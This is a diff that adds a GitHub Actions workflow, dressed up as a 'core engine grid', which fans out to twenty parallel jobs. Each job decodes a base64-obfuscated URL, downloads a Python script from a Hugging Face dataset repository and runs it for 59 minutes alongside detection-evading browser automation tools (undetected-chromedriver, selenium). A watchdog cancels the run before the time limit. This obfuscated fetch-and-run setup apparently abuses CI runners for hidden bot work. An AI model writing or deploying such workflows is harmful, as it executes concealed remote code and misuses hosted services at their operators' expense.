@@ -1,0 +1,103 @@
+name: Horizon Core Engine Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: core-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: waits 59 minutes then cancels the entire workflow run
+  # =================================================================
+  grid-watchdog:
+    name: "System Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_DURATION: 3540
+    steps:
+      - name: Activate Watchdog
+        run: |
+          echo "[WATCHDOG] Watchdog initialized for execution: ${{ github.run_id }}"
+          echo "[WATCHDOG] Holding state for ${WATCH_DURATION} seconds."
+
+          sleep "${WATCH_DURATION}"
+
+          echo "[WATCHDOG] Threshold reached — dispatching termination signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Termination signal dispatched successfully."
+
+  # =================================================================
+  # Worker Nodes: parallel execution of distributed nodes
+  # =================================================================
+  worker-nodes:
+    name: "Node-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [alpha-101, beta-102, gamma-103, delta-104, epsilon-105, zeta-106, eta-107, theta-108, iota-109, kappa-110, lambda-111, mu-112, nu-113, xi-114, omicron-115, pi-116, rho-117, sigma-118, tau-119, upsilon-120]
+
+    steps:
+      # #################################################################
+      # Stage 1: Setup environment
+      # #################################################################
+      - name: Prepare Environment
+        run: |
+          echo "[SETUP] Preparing Node-${{ matrix.node_code }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Stage 2: Fetch core module
+      # #################################################################
+      - name: Fetch Core Module
+        run: |
+          echo "[FETCH] Downloading core module from remote storage..."
+          MODULE_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$MODULE_URL" -o worker_core.py
+          echo "[FETCH] Core module secured."
+
+      # #################################################################
+      # Stage 3: Install dependencies
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing required Python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Stage 4: Execute worker process (59-minute boundary)
+      # #################################################################
+      - name: Execute Worker Process
+        run: |
+          echo ">> Starting Node-${{ matrix.node_code }} worker..."
+
+          python3 worker_core.py &
+          WORKER_PID=$!
+
+          echo ">> Worker active. Maximum allowed duration: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$WORKER_PID" 2>/dev/null; then
+            echo ">> Time limit exceeded — stopping worker process."
+            kill -9 "$WORKER_PID"
+            echo ">> Worker stopped by controller."
+          else
+            echo ">> Worker finished execution prior to time limit."
+          fi
